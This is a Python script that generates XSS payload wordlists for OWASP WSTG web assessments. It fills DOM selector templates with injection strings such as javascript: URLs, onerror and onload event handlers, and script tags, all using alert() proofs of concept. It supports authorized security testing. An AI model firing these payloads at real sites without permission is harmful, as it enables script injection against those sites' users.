#!/usr/bin/env python3
"""
shuttle_gen.py

For each WSTG assessment in the injection router (Client_Side or Server_Side):

  folder  = <root>/<project>/<category>/<wstg_id>/
  config  = <the one .json file in `folder`>  (or --config if passed)
  for each association in config["Associations"]:
      for side in ("Input", "Output"):
          if present: read side["File"], emit wordlist
      wordlist = folder / f"{xml_index}_wordlist_SFC{i|o}{N}.txt"

Behavior:
  - No --config        -> each folder must contain EXACTLY ONE .json (strict).
                          Zero or multiple -> warn + STOP the run.
  - --config passed    -> that file is used only for the folder it lives in.
                          If it isn't inside an assessment folder -> error.
  - Missing source file (side["File"]) -> warn + skip that association-side.
  - Each wordlist contains BOTH bare and business_complex payloads.
  - One payload per line.
  - Absolute paths in config (no resolution).

Volume control (added for the orchestrator pipeline):
  - The full shuttle x variance x context cross-product is generated first (this can run into
    the hundreds of lines for a single element), then deduplicated, then a random --cap-percent
    percent of what's left is kept. The sample is NOT seeded: re-running against the same input
    gives a different slice each time, by design (the operator asked for this, not a fixed pick).
  - This is a volume cap only. It does not pick payloads by relevance to the element's actual
    attribute/context - that was deliberately left alone; see the project's own notes before
    changing SPEC's context selection logic.
"""

from __future__ import annotations

import argparse
import json
import math
import random
import re
import sys
from pathlib import Path


# ==================================================================
# SPEC
# ==================================================================

SPEC = {
    "contexts": {
        "javascript_url": {
            "bare": [
                '<a href="javascript:alert(1)">click</a>',
                '<iframe src="javascript:alert(1)">',
            ],
            "complex": [
                '<a href="javascript:alert(PAYLOAD)">click</a>',
                '<iframe src="javascript:alert(PAYLOAD)">',
            ],
        },
        "event_handler": {
            "bare": [
                '<img src=x onerror="alert(1)">',
                '<body onload="alert(1)">',
                '<div onclick="alert(1)">click me</div>',
                '<svg onload="alert(1)">',
            ],
            "complex": [
                '<img src=x onerror="alert(PAYLOAD)">',
                '<body onload="alert(PAYLOAD)">',
                '<div onclick="alert(PAYLOAD)">click me</div>',
                '<svg onload="alert(PAYLOAD)">',
            ],
        },
        "img_tag_handler": {
            "bare": ['<img src=x ATTRIBUTE="alert(1)">'],
            "complex": ['<img src=x ATTRIBUTE="alert(PAYLOAD)">'],
        },
        "script_bare": {
            "bare": ["<script>SHUTTLE</script>"],
            "complex": ["<script>SHUTTLE</script>"],
        },
        "script_and_tag": {
            "bare": ["<script>TAG_OR_SHUTTLE</script>"],
            "complex": ["<script>TAG_OR_SHUTTLE</script>"],
        },
        "svg_tag": {
            "bare": ['<svg onload="alert(1)">'],
            "complex": ['<svg><animate onbegin=alert(PAYLOAD) attributeName=x dur=1s>'],
        },
        "iframe_javascript_source": {
            "bare": ['<iframe src="javascript:alert(1)">'],
            "complex": ['<iframe src="javascript:alert(PAYLOAD)">'],
        },
    },
    "shuttles": {
        "full_line_inside_element":
            'document.querySelector("div#srp-search-box > div > div > form > '
            'div:nth-of-type(1) > div > div > FOCUS_TAG")',
        "whole_chain":
            'document.querySelector("FULL_CHAIN_HERE")',
        "query_selector_from_root":
            'document.getElementById("ELEMENT_VALUE").querySelector("FOCUS_TAG")',
        "first_element_spam":
            'document.getElementById("ELEMENT_VALUE").firstElementChild.firstElementChild',
        "closest_approach":
            'FOCUS_TAG.closest("#ELEMENT_VALUE")',
        "nth_of_type":
            'document.querySelector("#ELEMENT_VALUE form div:nth-of-type(1) FOCUS_TAG")',
        "node_list_indexing":
            'document.getElementById("ELEMENT_VALUE").querySelectorAll("FOCUS_TAG")[0]',
        "get_elements_by_tag_name_indexing":
            'document.getElementById("ELEMENT_VALUE").getElementsByTagName("FOCUS_TAG")[0]',
    },
    "variance": {
        "text_content": ".textContent",
        "inner_html": ".innerHTML",
    },
}

BUSINESS_NAME = "BUSINESS_NAME_HERE"
DEFAULT_CAP_PERCENT = 10


# ==================================================================
# PARSER
# ==================================================================

SEGMENT_RE = re.compile(r"^\s*(?P<tag>[a-zA-Z][a-zA-Z0-9-]*)(?P<rest>.*?)\s*$", re.VERBOSE)
ID_RE = re.compile(r"#([A-Za-z0-9_-]+)")


def split_chain(chain: str) -> list:
    parts, buf, depth = [], [], 0
    for ch in chain:
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth -= 1
        if ch == ">" and depth == 0:
            parts.append("".join(buf).strip())
            buf = []
        else:
            buf.append(ch)
    if buf:
        parts.append("".join(buf).strip())
    return [p for p in parts if p]


def parse_tag(segment: str):
    m = SEGMENT_RE.match(segment)
    return m.group("tag").lower() if m else None


def parse_id(segment: str):
    m = ID_RE.search(segment)
    return m.group(1) if m else None


def analyze_element_chain(chain: str) -> dict:
    segments = split_chain(chain)
    warnings = []
    if not segments:
        return {
            "FULL_CHAIN_HERE": chain,
            "FOCUS_TAG": None,
            "ELEMENT_VALUE": None,
            "ELEMENT_VALUE_SOURCE": None,
            "segments": [],
            "warnings": ["empty chain"],
        }

    focus_tag = parse_tag(segments[-1])
    if not focus_tag:
        warnings.append(f"could not parse tag from last segment: {segments[-1]!r}")

    first_id = parse_id(segments[0])
    if first_id:
        element_value = first_id
        element_value_source = "id"
    else:
        element_value = parse_tag(segments[0])
        element_value_source = "tag"
        warnings.append(
            "no #id in first segment; ELEMENT_VALUE fell back to tag "
            f"{element_value!r} — getElementById shuttles will not resolve"
        )

    return {
        "FULL_CHAIN_HERE": chain,
        "FOCUS_TAG": focus_tag,
        "ELEMENT_VALUE": element_value,
        "ELEMENT_VALUE_SOURCE": element_value_source,
        "segments": segments,
        "warnings": warnings,
    }


# ==================================================================
# GENERATOR
# ==================================================================

def fill_template(template: str, variables: dict) -> str:
    out = template
    for k, v in variables.items():
        out = out.replace(k, v)
    return out


def wrap_string(value: str, quote: str | None = None) -> str:
    if quote is None:
        quote = '"' if ("'" in value and '"' not in value) else "'"
    if quote == "'":
        escaped = value.replace("\\", "\\\\").replace("'", "\\'")
    elif quote == '"':
        escaped = value.replace("\\", "\\\\").replace('"', '\\"')
    else:
        raise ValueError(f"Unsupported quote: {quote!r}")
    return f"{quote}{escaped}{quote}"


def build_payloads_for_item(item: dict) -> list:
    chain = item.get("element")
    if not chain:
        return []
    parsed = analyze_element_chain(chain)
    vars_ = {
        "FULL_CHAIN_HERE": parsed["FULL_CHAIN_HERE"],
        "ELEMENT_VALUE":   parsed["ELEMENT_VALUE"] or "ELEMENT_VALUE",
        "FOCUS_TAG":       parsed["FOCUS_TAG"] or "FOCUS_TAG",
    }
    out = []
    for shuttle_tpl in SPEC["shuttles"].values():
        shuttle = fill_template(shuttle_tpl, vars_)
        for var_str in SPEC["variance"].values():
            sink = shuttle + var_str
            for ctx_set in SPEC["contexts"].values():
                for ctx in ctx_set["bare"]:
                    out.append(f"{sink} = {wrap_string(ctx)}")
                for ctx_tpl in ctx_set["complex"]:
                    ctx = ctx_tpl.replace("PAYLOAD", BUSINESS_NAME)
                    out.append(f"{sink} = {wrap_string(ctx)}")
    return out


def cap_payloads(payloads: list, cap_percent: float) -> list:
    """Dedup (order-preserving), then keep a random cap_percent% of what's left.

    Not seeded on purpose: the same input produces a different slice on each run.
    Returns the full deduped list untouched if cap_percent >= 100 or there's nothing to cap.
    """
    deduped = list(dict.fromkeys(payloads))  # dedup, keep first-seen order
    if not deduped or cap_percent >= 100:
        return deduped
    keep = max(1, math.ceil(len(deduped) * cap_percent / 100)) if deduped else 0
    keep = min(keep, len(deduped))
    return random.sample(deduped, keep)


def load_items_from_json(path: Path) -> list:
    data = json.loads(path.read_text(encoding="utf-8"))
    if isinstance(data, dict):
        return [data] if "element" in data else []
    if isinstance(data, list):
        return [it for it in data if isinstance(it, dict) and "element" in it]
    return []


# ==================================================================
# PATH / CONFIG RESOLUTION
# ==================================================================

def load_router(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def resolve_assessment_dirs(root: Path, project: str, router: dict, side: str) -> list:
    entries = router.get(side) or []
    base = root / project
    return [
        (e["wstg_id"], base / e["category"] / e["wstg_id"], e.get("name", ""))
        for e in entries
    ]


def find_config_in_folder(folder: Path) -> Path:
    """
    Strict: exactly one *.json in folder.
    Raises RuntimeError if zero or multiple.
    """
    candidates = sorted(folder.glob("*.json"))
    if len(candidates) == 0:
        raise RuntimeError(f"no *.json config found in {folder}")
    if len(candidates) > 1:
        names = ", ".join(p.name for p in candidates)
        raise RuntimeError(f"expected exactly one *.json in {folder}, found {len(candidates)}: {names}")
    return candidates[0]


def load_config(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


# ==================================================================
# WRITING
# ==================================================================

def write_wordlist(items: list, out_path: Path, cap_percent: float = DEFAULT_CAP_PERCENT) -> int:
    payloads = []
    for it in items:
        payloads.extend(build_payloads_for_item(it))
    payloads = cap_payloads(payloads, cap_percent)
    out_path.write_text("\n".join(payloads) + ("\n" if payloads else ""), encoding="utf-8")
    return len(payloads)


def run_single_file(path: Path, out_path: Path | None = None, dry_run: bool = False,
                     cap_percent: float = DEFAULT_CAP_PERCENT) -> int:
    if not path.exists():
        print(f"[!] file not found: {path}", file=sys.stderr)
        return 1

    items = load_items_from_json(path)
    if not items:
        print(f"[!] no element items in {path}", file=sys.stderr)
        return 1

    print(f"[*] loaded {len(items)} item(s) from {path}")
    for i, it in enumerate(items):
        parsed = analyze_element_chain(it["element"])
        print(f"    item {i}:")
        print(f"      element          = {it['element']}")
        print(f"      FULL_CHAIN_HERE  = {parsed['FULL_CHAIN_HERE']}")
        print(f"      ELEMENT_VALUE    = {parsed['ELEMENT_VALUE']}  ({parsed['ELEMENT_VALUE_SOURCE']})")
        print(f"      FOCUS_TAG        = {parsed['FOCUS_TAG']}")
        for w in parsed["warnings"]:
            print(f"      ⚠ {w}")

    raw = []
    for it in items:
        raw.extend(build_payloads_for_item(it))
    payloads = cap_payloads(raw, cap_percent)

    print(f"\n[*] generated {len(raw)} raw payload line(s), "
          f"{len(set(raw))} after dedup, kept {len(payloads)} ({cap_percent}% cap)")
    print("[*] sample (first 6 kept):")
    for p in payloads[:6]:
        print(f"    {p}")

    if out_path:
        if dry_run:
            print(f"[dry] would write {out_path}")
        else:
            out_path.write_text("\n".join(payloads) + ("\n" if payloads else ""), encoding="utf-8")
            print(f"[✓] wrote {len(payloads)} payloads -> {out_path}")
    return 0


# ==================================================================
# MAIN
# ==================================================================

def main(argv=None) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--root", required=None)
    ap.add_argument("--project", required=None)
    ap.add_argument("--router", required=None)
    ap.add_argument("--side", default="Client_Side", choices=["Client_Side", "Server_Side"])
    ap.add_argument("--config", default=None,
                    help="Optional: path to a specific config JSON. "
                         "Must live inside one of the assessment folders; "
                         "used for that folder only.")
    ap.add_argument("--cap-percent", type=float, default=DEFAULT_CAP_PERCENT, dest="cap_percent",
                    help=f"Keep this percent of the deduped payload list, picked at random "
                         f"with a fresh slice each run (default: {DEFAULT_CAP_PERCENT}).")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--single-file", default=None,
                    help="Test mode: process one input JSON directly, ignore router.")
    ap.add_argument("--out", default=None,
                    help="With --single-file: optional output .txt path.")
    args = ap.parse_args(argv)
    if args.cap_percent <= 0:
        print("[!] --cap-percent must be greater than 0", file=sys.stderr)
        return 1
    if args.single_file:
        return run_single_file(
            Path(args.single_file),
            Path(args.out) if args.out else None,
            dry_run=args.dry_run,
            cap_percent=args.cap_percent,
        )

    root = Path(args.root)
    router = load_router(Path(args.router))
    assessments = resolve_assessment_dirs(root, args.project, router, args.side)

    if not assessments:
        print(f"[!] Router has no entries for side={args.side}", file=sys.stderr)
        return 1

    print(f"[*] root:    {root}")
    print(f"[*] project: {args.project}")
    print(f"[*] side:    {args.side}")
    print(f"[*] cap:     {args.cap_percent}%")
    print(f"[*] assessments: {len(assessments)}")

    # If --config provided, figure out which assessment folder it belongs to.
    override_folder = None
    if args.config:
        cfg_path = Path(args.config)
        if not cfg_path.exists():
            print(f"[!] --config not found: {cfg_path}", file=sys.stderr)
            return 1
        cfg_parent = cfg_path.resolve().parent
        for _, folder, _ in assessments:
            if cfg_parent == folder.resolve():
                override_folder = folder
                break
        if override_folder is None:
            print(f"[!] --config {cfg_path} is not inside any {args.side} assessment folder",
                  file=sys.stderr)
            return 1
        print(f"[*] override config: {cfg_path}  (applies to {override_folder.name} only)")

    total_files = 0
    total_payloads = 0

    for wstg_id, folder, name in assessments:
        print(f"\n[+] {wstg_id}  ({name})")
        print(f"    folder: {folder}")

        if not folder.exists():
            print(f"    [!] folder does not exist -> stop", file=sys.stderr)
            return 1

        # Determine the config for this assessment
        try:
            if args.config and folder.resolve() == override_folder.resolve():
                config_path = Path(args.config)
            else:
                config_path = find_config_in_folder(folder)
        except RuntimeError as e:
            print(f"    [!] {e} -> stop", file=sys.stderr)
            return 1

        print(f"    config: {config_path.name}")
        config = load_config(config_path)

        associations = config.get("Associations") or []
        if not associations:
            print(f"    [!] no Associations in config -> stop", file=sys.stderr)
            return 1

        for assoc in associations:
            xml_index = assoc.get("Xml_index")
            if xml_index is None:
                print(f"    [-] association missing Xml_index, skipping")
                continue

            for side_key, prefix in (("Input", "SFCi"), ("Output", "SFCo")):
                block = assoc.get(side_key)
                if not block:
                    continue
                file_path = block.get("File")
                num = block.get(side_key)
                if file_path is None or num is None:
                    continue

                src = Path(file_path)
                if not src.exists():
                    print(f"    [!] {side_key} file missing, skipping: {src}")
                    continue

                try:
                    items = load_items_from_json(src)
                except Exception as e:
                    print(f"    [!] failed to load {src}: {e}")
                    continue

                if not items:
                    print(f"    [-] {src.name}: no element items")
                    continue

                out_name = f"{xml_index}_wordlist_{prefix}{num}.txt"
                out_path = folder / out_name

                if args.dry_run:
                    print(f"    [dry] would write {out_path}  ({len(items)} items)")
                    continue

                n = write_wordlist(items, out_path, args.cap_percent)
                total_files += 1
                total_payloads += n
                print(f"    [✓] {out_name}  ({len(items)} items -> {n} payloads)")

    print(f"\n[=] files written: {total_files}")
    print(f"[=] payloads total: {total_payloads}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
